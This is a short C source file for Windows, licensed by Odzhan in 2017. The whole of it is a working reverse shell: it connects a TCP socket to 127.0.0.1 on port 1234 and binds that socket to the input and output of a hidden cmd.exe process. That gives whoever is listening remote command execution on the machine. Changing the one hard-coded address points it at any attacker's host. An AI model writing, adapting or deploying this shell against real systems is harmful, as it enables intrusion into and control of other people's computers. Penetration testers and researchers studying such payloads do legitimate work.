/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_ 
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

void main(void)
{
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  WSADATA             wsa;
  SOCKET              s;
  struct sockaddr_in  sa;
  u_long              ip;
    
  WSAStartup(MAKEWORD(2,0), &wsa);
  
  s=WSASocket (AF_INET, SOCK_STREAM, 
      IPPROTO_IP, NULL, 0, 0);

  ip = inet_addr ("127.0.0.1"); 
    
  sa.sin_family = AF_INET;
  sa.sin_port   = htons(1234);
  
  memcpy ((void*)&sa.sin_addr, 
      (void*)&ip, sizeof(ip));
    
  if (!connect(s, (struct sockaddr*)&sa, sizeof(sa)))
  {
    memset ((void*)&si, 0, sizeof(si));

    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError  = (HANDLE)s;

    if (CreateProcess (NULL, "cmd", NULL, NULL, 
        TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
      WaitForSingleObject (pi.hProcess, INFINITE);  
      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);
    }
  }
  closesocket (s);
}
